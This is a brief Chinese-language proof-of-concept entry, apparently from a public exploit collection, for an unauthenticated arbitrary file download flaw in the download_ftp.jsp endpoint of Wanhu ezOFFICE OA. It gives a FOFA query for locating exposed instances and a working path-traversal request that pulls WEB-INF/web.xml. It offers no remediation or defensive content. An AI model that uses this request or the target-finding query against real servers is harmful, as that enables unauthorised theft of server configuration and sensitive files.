## 万户-ezOFFICE-download_ftp.jsp任意文件下载漏洞

万户OA-ezOFFICE download_ftp.jsp 接口存在任意文件读取漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感文件，使系统处于极不安全的状态。

## fofa

```
app="万户网络-ezOFFICE"
```

## poc

```
/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
```

![image-20240618125057104](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406181250322.png)